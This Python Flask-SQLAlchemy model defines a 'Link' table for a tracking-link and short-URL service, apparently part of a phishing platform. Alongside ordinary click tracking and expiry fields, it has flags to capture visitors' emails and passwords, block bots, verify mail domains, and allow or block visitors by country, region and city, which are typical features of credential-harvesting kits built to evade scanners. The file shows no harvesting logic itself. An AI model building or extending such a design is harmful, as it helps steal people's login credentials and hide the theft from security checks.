'''
Link Model - Tracking links and short URLs
'''

from src.database import db
from datetime import datetime
import json
import string
import random

def generate_short_code(length=8):
    """Generate random short code"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

class Link(db.Model):
    __tablename__ = 'links'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id', ondelete='CASCADE'), nullable=False, index=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaigns.id', ondelete='SET NULL'), nullable=True, index=True)
    
    # URLs
    target_url = db.Column(db.Text, nullable=False)  # Original destination URL
    short_code = db.Column(db.String(50), unique=True, nullable=False, index=True, default=generate_short_code)
    custom_slug = db.Column(db.String(100), unique=True, nullable=True)
    domain = db.Column(db.String(255), nullable=True)
    
    # Campaign Info
    campaign_name = db.Column(db.String(255), nullable=True)
    
    # Metadata
    title = db.Column(db.String(255), nullable=True)
    description = db.Column(db.Text, nullable=True)
    tags = db.Column(db.Text, nullable=True)  # JSON array
    
    # Status and Limits
    status = db.Column(db.String(50), default='active', nullable=False)  # active, paused, expired
    is_active = db.Column(db.Boolean, default=True, nullable=False)
    expires_at = db.Column(db.DateTime, nullable=True)
    expiration_action = db.Column(db.String(50), default='redirect', nullable=True)  # redirect, message, 404
    expiration_redirect_url = db.Column(db.Text, nullable=True)
    
    # Click Tracking
    click_count = db.Column(db.Integer, default=0, nullable=False)
    unique_clicks = db.Column(db.Integer, default=0, nullable=False)
    click_limit = db.Column(db.Integer, nullable=True)
    last_clicked_at = db.Column(db.DateTime, nullable=True)
    
    # Advanced Features
    capture_email = db.Column(db.Boolean, default=False)
    capture_password = db.Column(db.Boolean, default=False)
    bot_blocking_enabled = db.Column(db.Boolean, default=False)
    geo_targeting_enabled = db.Column(db.Boolean, default=False)
    geo_targeting_type = db.Column(db.String(20), default='allow')  # allow or block
    rate_limiting_enabled = db.Column(db.Boolean, default=False)
    dynamic_signature_enabled = db.Column(db.Boolean, default=False)
    mx_verification_enabled = db.Column(db.Boolean, default=False)
    
    # Geo Targeting
    allowed_countries = db.Column(db.Text, nullable=True)  # JSON array
    blocked_countries = db.Column(db.Text, nullable=True)  # JSON array
    allowed_regions = db.Column(db.Text, nullable=True)  # JSON array
    blocked_regions = db.Column(db.Text, nullable=True)  # JSON array
    allowed_cities = db.Column(db.Text, nullable=True)  # JSON array
    blocked_cities = db.Column(db.Text, nullable=True)  # JSON array
    
    # Preview and Templates
    preview_template_url = db.Column(db.Text, nullable=True)
    qr_code_url = db.Column(db.Text, nullable=True)
    
    # Facebook Pixel
    facebook_pixel_id = db.Column(db.String(255), nullable=True)
    enable_facebook_pixel = db.Column(db.Boolean, default=False)
    
    # Timestamps
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False, index=True)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow, nullable=False)
    
    # Relationships
    tracking_events = db.relationship('TrackingEvent', backref='link', lazy='dynamic', cascade='all, delete-orphan')
    
    def __init__(self, **kwargs):
        """Initialize link with auto-generated short code if not provided"""
        if 'short_code' not in kwargs or not kwargs['short_code']:
            # Generate unique short code
            while True:
                code = generate_short_code()
                if not Link.query.filter_by(short_code=code).first():
                    kwargs['short_code'] = code
                    break
        super(Link, self).__init__(**kwargs)

    def to_dict(self):
        """Convert link to dictionary"""
        return {
            'id': self.id,
            'user_id': self.user_id,
            'target_url': self.target_url,
            'short_code': self.short_code,
            'custom_slug': self.custom_slug,
            'domain': self.domain,
            'title': self.title,
            'description': self.description,
            'tags': json.loads(self.tags) if self.tags else [],
            'status': self.status,
            'is_active': self.is_active,
            'expires_at': self.expires_at.isoformat() if self.expires_at else None,
            'click_count': self.click_count,
            'unique_clicks': self.unique_clicks,
            'last_clicked_at': self.last_clicked_at.isoformat() if self.last_clicked_at else None,
            'capture_email': self.capture_email,
            'capture_password': self.capture_password,
            'bot_blocking_enabled': self.bot_blocking_enabled,
            'geo_targeting_enabled': self.geo_targeting_enabled,
            'allowed_countries': json.loads(self.allowed_countries) if self.allowed_countries else [],
            'blocked_countries': json.loads(self.blocked_countries) if self.blocked_countries else [],
            'facebook_pixel_id': self.facebook_pixel_id,
            'enable_facebook_pixel': self.enable_facebook_pixel,
            'created_at': self.created_at.isoformat(),
            'updated_at': self.updated_at.isoformat()
        }

    def __repr__(self):
        return f'<Link {self.short_code}>'
